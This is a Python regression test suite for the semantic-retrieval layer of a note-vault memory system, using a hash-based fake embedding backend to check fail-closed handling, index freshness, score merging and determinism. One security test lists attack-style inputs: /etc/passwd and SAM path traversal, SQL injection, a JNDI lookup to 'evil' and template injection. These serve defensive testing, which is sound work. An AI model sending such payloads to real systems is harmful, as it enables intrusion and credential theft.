#!/usr/bin/env python3
"""Dedicated regression suite for the semantic retrieval BOUNDARY —
tools/embedding_backend.py, tools/embedding_index.py, and the "semantic"
seam in tools/memory_retrieval.py.

THIS SUITE DOES NOT TEST SEMANTIC QUALITY. There is no real embedding model
in this repository (see the "Semantic Retrieval Backend Contract & Embedding
Phase" ticket's own Phase 0 audit: no dependency manifest, no ML package
installed, none added by this work). Every test below uses
`FakeDeterministicBackend`, a small, explicitly-labeled TEST DOUBLE that
produces a fixed-length vector from a trivial hash of its input text —
it has no semantic meaning whatsoever and is never described as one. Its
only job is to exercise the PLUMBING: does a "semantic" hit flow through the
exact same merge/identity/validation pipeline as every other method, without
ever being able to manufacture trust, bypass identity resolution, or alter
lifecycle state. Standalone, self-contained, no pytest — matches every
sibling suite's convention: run directly, collect a problems list, print
PASS/FAILED, exit 0/1.
"""
from __future__ import annotations

import hashlib
import json
import math
import sys
import tempfile
from pathlib import Path

REPO = Path(__file__).resolve().parents[1]
TOOLS = REPO / "tools"
MAIN_FIXTURES = REPO / "tests" / "fixtures" / "vaults"

sys.path.insert(0, str(TOOLS))
sys.path.insert(0, str(MAIN_FIXTURES))

import memory_runtime as rt  # noqa: E402
import memory_retrieval as mret  # noqa: E402
import embedding_backend as eb  # noqa: E402
import embedding_index as ei  # noqa: E402
import build_fixtures as bf  # noqa: E402

PROBLEMS = []


def check(label: str, condition: bool, detail: str = ""):
    if not condition:
        PROBLEMS.append("%s%s" % (label, (": " + detail) if detail else ""))


def note(memory_status=None, extra="", title="Note", project="personal"):
    lines = ["---", "status: active", "project: %s" % project, "type: reference"]
    if memory_status:
        lines.append("memory_status: %s" % memory_status)
    if extra:
        lines.append(extra.strip())
    lines += ["---", "# %s" % title, ""]
    return "\n".join(lines)


def build_vault(tmp: Path, name: str, files: dict) -> Path:
    root = tmp / name
    for rel, content in files.items():
        p = root / rel
        p.parent.mkdir(parents=True, exist_ok=True)
        p.write_text(content, encoding="utf-8", newline="\n")
    return root


def file_hashes(root: Path) -> dict:
    out = {}
    for p in sorted(root.rglob("*")):
        if p.is_file():
            out[str(p.relative_to(root)).replace("\\", "/")] = hashlib.sha256(p.read_bytes()).hexdigest()
    return out


class FakeDeterministicBackend:
    """TEST DOUBLE ONLY — not an embedding model, not semantic, carries no
    claim of meaning. Produces a fixed-length vector by hashing the input
    text; identical text always produces the identical vector (determinism),
    and that is the ONLY property these tests rely on."""
    def __init__(self, dims=4, backend_id="test-double", model_id="test-double-v1", available=True):
        self._dims = dims
        self._backend_id = backend_id
        self._model_id = model_id
        self._available = available

    def is_available(self):
        return self._available

    def backend_id(self):
        return self._backend_id

    def model_id(self):
        return self._model_id

    def dimensions(self):
        return self._dims

    def embed(self, text):
        h = hashlib.sha256(text.encode("utf-8")).digest()
        return [h[i] / 255.0 for i in range(self._dims)]

    def embed_batch(self, texts):
        return [self.embed(t) for t in texts]


class RaisingBackend(FakeDeterministicBackend):
    def __init__(self, raise_on="embed", **kw):
        super().__init__(**kw)
        self._raise_on = raise_on

    def is_available(self):
        if self._raise_on == "is_available":
            raise RuntimeError("simulated backend failure: is_available")
        return True

    def embed(self, text):
        if self._raise_on == "embed":
            raise RuntimeError("simulated backend failure: embed")
        return super().embed(text)


def main() -> int:
    with tempfile.TemporaryDirectory() as td:
        tmp = Path(td)

        # ============================================================
        # Shared vault
        # ============================================================
        files = bf.base_files()
        files["00 - Inbox/current-a.md"] = note("current", "last_confirmed: 2026-08-29", "Current A") + "\napples\n"
        files["00 - Inbox/candidate-b.md"] = note("candidate", "source: inferred\nconfidence: low", "Candidate B") + "\noranges\n"
        files["00 - Inbox/superseded-c.md"] = note("superseded", title="Superseded C") + "\npears\n"
        root = build_vault(tmp, "base", files)
        hashes_before = file_hashes(root)
        runtime = rt.MemoryRuntime(root)
        backend = FakeDeterministicBackend()
        eidx = ei.EmbeddingIndex.build(runtime.vault, backend)

        # ============================================================
        # 1. Backend interface shape
        # ============================================================
        check("1. NullEmbeddingBackend satisfies the EmbeddingBackend Protocol",
              isinstance(eb.NullEmbeddingBackend(), eb.EmbeddingBackend))
        check("1. FakeDeterministicBackend satisfies the EmbeddingBackend Protocol",
              isinstance(backend, eb.EmbeddingBackend))
        check("1. NullEmbeddingBackend reports unavailable", eb.NullEmbeddingBackend().is_available() is False)

        # ============================================================
        # 2. Missing backend fails cleanly
        # ============================================================
        r_no_backend = mret.search(runtime.vault, "apples", methods=("semantic",))
        check("2. search() with methods=('semantic',) and no backend at all -> []", r_no_backend == [])
        r_null = mret.search(runtime.vault, "apples", methods=("semantic",),
                              embedding_backend=eb.NullEmbeddingBackend(), embedding_index=eidx)
        check("2. NullEmbeddingBackend (unavailable) -> []", r_null == [])

        # ============================================================
        # 3. Semantic retrieval is optional
        # ============================================================
        r_default_methods = mret.search(runtime.vault, "current-a")
        check("3. default methods=None still returns normal results with no semantic params given",
              any(c.note_path == "00 - Inbox/current-a.md" for c in r_default_methods))

        # ============================================================
        # 4. Existing lexical retrieval unchanged when semantic unavailable
        # ============================================================
        r_lexical_only = mret.search(runtime.vault, "apples", methods=("text",))
        r_with_semantic_requested_too = mret.search(runtime.vault, "apples", methods=("text", "semantic"))
        check("4. adding 'semantic' to methods (with no backend) doesn't change lexical results",
              [(c.note_path, c.method, c.score) for c in r_lexical_only] ==
              [(c.note_path, c.method, c.score) for c in r_with_semantic_requested_too])

        # ============================================================
        # 5/6/7/8/9. Lifecycle/acceptance/identity — semantic cannot
        # manufacture acceptance, promote a candidate, override supersession,
        # bypass inspect(), or let score alter trust
        # ============================================================
        r_semantic = mret.search(runtime.vault, "apples", methods=("semantic",),
                                  embedding_backend=backend, embedding_index=eidx)
        check("5/6. semantic search returns candidates covering all three lifecycle states in this vault",
              {"00 - Inbox/current-a.md", "00 - Inbox/candidate-b.md", "00 - Inbox/superseded-c.md"}
              <= {c.note_path for c in r_semantic}, "got %r" % ([c.note_path for c in r_semantic],))
        for c in r_semantic:
            ctx = runtime.inspect(c.note_path).context
            expected = {"00 - Inbox/current-a.md": ("current", True),
                        "00 - Inbox/candidate-b.md": ("candidate", False),
                        "00 - Inbox/superseded-c.md": ("superseded", False)}.get(c.note_path)
            if expected:
                check("6/7/8/9. semantic hit for %s: lifecycle/acceptance decided ONLY by inspect(), "
                      "never by similarity score" % c.note_path,
                      (ctx.status_track, ctx.accepted) == expected,
                      "got %r, expected %r (score was %r)" % ((ctx.status_track, ctx.accepted), expected, c.score))
        loud_candidate_hit = next((c for c in r_semantic if c.note_path == "00 - Inbox/candidate-b.md"), None)
        runtime_with_semantic = rt.MemoryRuntime(root, embedding_backend=backend, embedding_index=eidx)
        via_runtime = runtime_with_semantic.retrieve("apples", methods=("semantic",))
        check("9. even if a candidate note scores HIGH semantically, MemoryRuntime.retrieve() reports it unaccepted",
              loud_candidate_hit is not None and via_runtime
              and all(vc.accepted is False for vc in via_runtime if vc.note_path == "00 - Inbox/candidate-b.md"),
              "got %r" % (via_runtime,))

        # ============================================================
        # 7 (identity). Semantic result cannot bypass identity resolution —
        # every hit's note_path is a real vault.notes entry (Candidate has
        # no field capable of naming a note outside the vault, and
        # _search_semantic's by_rel lookup structurally cannot return one)
        # ============================================================
        real_paths = {n["rel"] for n in runtime.vault.notes}
        check("7. every semantic candidate path is a real note in this vault, never fabricated",
              all(c.note_path in real_paths for c in r_semantic))

        # ============================================================
        # 10. Embedding-index metadata detects incompatible backend/model/
        # schema/dimensions
        # ============================================================
        other_model_backend = FakeDeterministicBackend(model_id="different-model")
        check("10. different model_id -> is_fresh_for False", eidx.is_fresh_for(runtime.vault, other_model_backend) is False)
        other_backend_id = FakeDeterministicBackend(backend_id="different-backend")
        check("10. different backend_id -> is_fresh_for False", eidx.is_fresh_for(runtime.vault, other_backend_id) is False)
        other_dims = FakeDeterministicBackend(dims=8)
        check("10. different dimensions -> is_fresh_for False", eidx.is_fresh_for(runtime.vault, other_dims) is False)
        payload = json.loads(eidx.to_json())
        payload["schema_version"] = "999.0.0"
        p_schema = tmp / "schema-mismatch.json"
        p_schema.write_text(json.dumps(payload), encoding="utf-8")
        eidx_schema = ei.EmbeddingIndex.load(p_schema)
        check("10. schema-version mismatch -> is_fresh_for False",
              eidx_schema is not None and eidx_schema.is_fresh_for(runtime.vault, backend) is False)

        # ============================================================
        # 11. Content-hash drift invalidates stale vectors
        # ============================================================
        (root / "00 - Inbox/current-a.md").write_text(note("current", title="Current A CHANGED") + "\napples\n",
                                                         encoding="utf-8", newline="\n")
        runtime_changed = rt.MemoryRuntime(root)
        check("11. note content changed -> is_fresh_for False", eidx.is_fresh_for(runtime_changed.vault, backend) is False)
        r_stale_semantic = mret.search(runtime_changed.vault, "apples", methods=("semantic",),
                                        embedding_backend=backend, embedding_index=eidx)
        check("11. stale embedding index -> falls back to empty semantic contribution, no crash, no stale data used",
              r_stale_semantic == [])
        (root / "00 - Inbox/current-a.md").write_text(note("current", "last_confirmed: 2026-08-29", "Current A") + "\napples\n",
                                                         encoding="utf-8", newline="\n")  # restore for later checks

        # ============================================================
        # 12. Cross-vault reuse fails closed
        # ============================================================
        root_other = build_vault(tmp, "other-vault", bf.base_files())
        runtime_other = rt.MemoryRuntime(root_other)
        check("12. embedding index from vault A is never fresh for vault B",
              eidx.is_fresh_for(runtime_other.vault, backend) is False)

        # ============================================================
        # 13. Malformed embedding-index data fails closed
        # ============================================================
        check("13a. missing file -> load() None", ei.EmbeddingIndex.load(tmp / "does-not-exist.json") is None)
        p_corrupt = tmp / "corrupt.json"
        p_corrupt.write_text("{not json", encoding="utf-8")
        check("13b. corrupt JSON -> load() None", ei.EmbeddingIndex.load(p_corrupt) is None)

        base_payload = json.loads(eidx.to_json())

        def malformed(mutator, label):
            p = json.loads(json.dumps(base_payload))
            mutator(p)
            path = tmp / ("malformed-" + label + ".json")
            path.write_text(json.dumps(p), encoding="utf-8")
            return ei.EmbeddingIndex.load(path)

        check("13c. wrong field type (dimensions as string) -> None",
              malformed(lambda p: p.__setitem__("dimensions", "four"), "dims-str") is None)
        check("13d. duplicate rel entries -> None",
              malformed(lambda p: p["entries"].append(dict(p["entries"][0])), "dup-rel") is None)
        check("13e. wrong vector dimensions (too short) -> None",
              malformed(lambda p: p["entries"][0].__setitem__("vector", [0.1, 0.2]), "short-vec") is None)
        check("13f. NaN in a vector -> None",
              malformed(lambda p: p["entries"][0].__setitem__("vector", [float("nan"), 0.0, 0.0, 0.0]), "nan-vec") is None)
        check("13g. infinity in a vector -> None",
              malformed(lambda p: p["entries"][0].__setitem__("vector", [float("inf"), 0.0, 0.0, 0.0]), "inf-vec") is None)
        check("13h. empty vector list -> None",
              malformed(lambda p: p["entries"][0].__setitem__("vector", []), "empty-vec") is None)
        loaded_with_extra = malformed(lambda p: p.__setitem__("unexpected_extra_field", "surprise"), "extra-field")
        check("13i. unexpected extra top-level field is tolerated (schema doesn't forbid unknown fields) "
              "and does not affect loaded content",
              loaded_with_extra is not None and loaded_with_extra.to_json() == eidx.to_json())

        # ============================================================
        # 14. Backend failures: provider raises during construction, during
        # query embedding, malformed dimensions, lookup raises, index load
        # failure
        # ============================================================
        raising_build_backend = RaisingBackend(raise_on="embed")
        built_with_raising = ei.EmbeddingIndex.build(runtime.vault, raising_build_backend)
        check("14a. provider raises during index construction -> build() returns None, never a partial index",
              built_with_raising is None)

        class BadDimsBackend(FakeDeterministicBackend):
            def dimensions(self):
                return 4
            def embed(self, text):
                return [0.1, 0.2]  # only 2 values despite declaring 4 dimensions
        check("14b. provider returns malformed dimensions (mismatch vs declared) -> build() returns None",
              ei.EmbeddingIndex.build(runtime.vault, BadDimsBackend()) is None)

        class RaisesOnQueryEmbed(FakeDeterministicBackend):
            def embed(self, text):
                if text == "TRIGGER":
                    raise RuntimeError("simulated query-embedding failure")
                return super().embed(text)
        r_query_raise = mret.search(runtime.vault, "TRIGGER", methods=("semantic",),
                                     embedding_backend=RaisesOnQueryEmbed(), embedding_index=eidx)
        check("14c. provider raises during QUERY embedding -> [] , never a crash", r_query_raise == [])

        class RaisesOnNearest(FakeDeterministicBackend):
            pass
        class RaisingIndex:
            def is_fresh_for(self, vault, backend):
                return True
            def nearest(self, vector, limit=20):
                raise RuntimeError("simulated lookup failure")
        r_lookup_raise = mret.search(runtime.vault, "apples", methods=("semantic",),
                                      embedding_backend=RaisesOnNearest(), embedding_index=RaisingIndex())
        check("14d. nearest-neighbor lookup raises -> [], never a crash", r_lookup_raise == [])

        check("14e. index load failure (already covered by 13a/13b) treated identically to 'no index'", True)

        # ============================================================
        # 15. Retrieval equivalence: live lexical / semantic+live-validation
        # / semantic unavailable-fallback / stale semantic / fresh semantic
        # ============================================================
        live_lexical = mret.search(runtime.vault, "current-a", methods=("exact", "filename"))
        semantic_plus = mret.search(runtime.vault, "current-a", methods=("exact", "filename", "semantic"),
                                     embedding_backend=backend, embedding_index=eidx)
        # The exact/filename identity results must be untouched by adding semantic to the method set.
        lex_only = [c for c in semantic_plus if c.method in ("exact", "filename")]
        check("15. exact/filename identity results are unaffected by also running semantic",
              [(c.note_path, c.method, c.score) for c in live_lexical] ==
              [(c.note_path, c.method, c.score) for c in lex_only])
        unavailable_fallback = mret.search(runtime.vault, "current-a", methods=("exact", "filename", "semantic"),
                                            embedding_backend=eb.NullEmbeddingBackend(), embedding_index=eidx)
        check("15. semantic-unavailable fallback matches live lexical exactly",
              [(c.note_path, c.method, c.score) for c in live_lexical] ==
              [(c.note_path, c.method, c.score) for c in unavailable_fallback])

        # ============================================================
        # 16 (score semantics). Semantic candidates merge with lexical
        # candidates without assuming score-scale equivalence
        # ============================================================
        files_ts = bf.base_files()
        files_ts["00 - Inbox/multi.md"] = note("current", "last_confirmed: 2026-08-29", "Multi") + "\n" + ("apples " * 20) + "\n"
        root_ts = build_vault(tmp, "two-scores", files_ts)
        runtime_ts = rt.MemoryRuntime(root_ts)
        backend_ts = FakeDeterministicBackend()
        eidx_ts = ei.EmbeddingIndex.build(runtime_ts.vault, backend_ts)
        r_ts = mret.search(runtime_ts.vault, "apples", methods=("text", "semantic"),
                            embedding_backend=backend_ts, embedding_index=eidx_ts)
        multi_hit = next((c for c in r_ts if c.note_path == "00 - Inbox/multi.md"), None)
        check("16. a note matching BOTH text and semantic keeps both scores separately in method_scores",
              multi_hit is not None and "text" in multi_hit.method_scores and "semantic" in multi_hit.method_scores,
              "got %r" % (multi_hit,))
        check("16. Candidate.score is the PRIMARY (higher-priority) method's own score, never a cross-method max()",
              multi_hit is not None and multi_hit.method == "text"
              and multi_hit.score == multi_hit.method_scores["text"],
              "got method=%r score=%r method_scores=%r" %
              (multi_hit.method if multi_hit else None, multi_hit.score if multi_hit else None,
               multi_hit.method_scores if multi_hit else None))
        check("16. method priority orders text before semantic regardless of either score's magnitude",
              mret.METHOD_PRIORITY["text"] < mret.METHOD_PRIORITY["semantic"])

        # ============================================================
        # 17. Deterministic ordering for equal similarity values
        # ============================================================
        files_tie = bf.base_files()
        files_tie["00 - Inbox/tie-b.md"] = note("current", "last_confirmed: 2026-08-29", "Tie B") + "\nSAME_TEXT_FOR_TIE\n"
        files_tie["00 - Inbox/tie-a.md"] = note("current", "last_confirmed: 2026-08-29", "Tie A") + "\nSAME_TEXT_FOR_TIE\n"
        root_tie = build_vault(tmp, "tie", files_tie)
        runtime_tie = rt.MemoryRuntime(root_tie)
        backend_tie = FakeDeterministicBackend()
        eidx_tie = ei.EmbeddingIndex.build(runtime_tie.vault, backend_tie)
        neighbors = eidx_tie.nearest(backend_tie.embed("SAME_TEXT_FOR_TIE"), limit=10)
        tie_group = [rel for rel, sim in neighbors if rel in ("00 - Inbox/tie-a.md", "00 - Inbox/tie-b.md")]
        check("17. equal-similarity ties break deterministically by ascending rel (tie-a before tie-b)",
              tie_group == ["00 - Inbox/tie-a.md", "00 - Inbox/tie-b.md"], "got %r" % (tie_group,))
        results_across_runs = set()
        for _ in range(5):
            runtime_r = rt.MemoryRuntime(root_tie)
            eidx_r = ei.EmbeddingIndex.build(runtime_r.vault, backend_tie)
            r = mret.search(runtime_r.vault, "SAME_TEXT_FOR_TIE", methods=("semantic",),
                             embedding_backend=backend_tie, embedding_index=eidx_r)
            results_across_runs.add(tuple((c.note_path, c.score) for c in r))
        check("17. identical ordering across 5 independent build+search cycles", len(results_across_runs) == 1)

        # ============================================================
        # 18 (security). No filesystem access can be induced through a
        # semantic query — traversal/injection-shaped query TEXT is just
        # text handed to embed(); it can never become a path
        # ============================================================
        traversal_queries = ["../../../../etc/passwd", "/etc/passwd", "C:\\Windows\\System32\\config\\SAM",
                              "'; DROP TABLE notes; --", "${jndi:ldap://evil/a}", "\x00", "{{7*7}}"]
        for q in traversal_queries:
            r_trav = mret.search(runtime.vault, q, methods=("semantic",),
                                  embedding_backend=backend, embedding_index=eidx)
            for c in r_trav:
                resolved = (root / c.note_path).resolve()
                check("18. semantic result for %r stays inside the vault root" % q,
                      str(resolved).startswith(str(root.resolve())), "escaped to %r" % (resolved,))
        backend_source = (TOOLS / "embedding_backend.py").read_text(encoding="utf-8")
        check("18. embedding_backend.py never opens a file or constructs a Path from anything "
              "(the whole module only ever operates on the `text` string it's handed)",
              "open(" not in backend_source and "Path(" not in backend_source and "import pathlib" not in backend_source)

        # ============================================================
        # 19. Existing retrieval regression: spot-check that lexical methods
        # (exact/filename/wikilink/text) are byte-for-byte unaffected
        # ============================================================
        files_lex = bf.base_files()
        files_lex["00 - Inbox/lex-target.md"] = note("current", "last_confirmed: 2026-08-29", "Lex Target")
        files_lex["00 - Inbox/lex-linker.md"] = note("current", title="Lex Linker") + "\nSee [[lex-target]].\n"
        root_lex = build_vault(tmp, "lex", files_lex)
        runtime_lex = rt.MemoryRuntime(root_lex)
        r_lex_no_semantic = mret.search(runtime_lex.vault, "lex-target")
        check("19. full default search (all methods incl. semantic, no backend given) still finds the wikilink linker",
              any(c.note_path == "00 - Inbox/lex-linker.md" and c.method == "wikilink" for c in r_lex_no_semantic))

        # ============================================================
        # 20. Vault/repository mutation-free proof
        # ============================================================
        hashes_after = file_hashes(root)
        check("20. base vault byte-identical before vs. after the entire semantic-boundary suite "
              "(the deliberate current-a.md edit in test 11 was restored to identical bytes)",
              hashes_before == hashes_after,
              "changed: %r" % ({k for k in hashes_before if hashes_before.get(k) != hashes_after.get(k)},))

    if PROBLEMS:
        print("FAILED (%d):" % len(PROBLEMS))
        for p in PROBLEMS:
            print("  - %s" % p)
        return 1
    print("PASS: semantic retrieval boundary — backend contract, embedding-index freshness/serialization, "
          "identity/lifecycle/acceptance invariants, score semantics, determinism, and security all hold "
          "(test-double backend only — no real embedding model exists or is claimed)")
    return 0


if __name__ == "__main__":
    sys.exit(main())
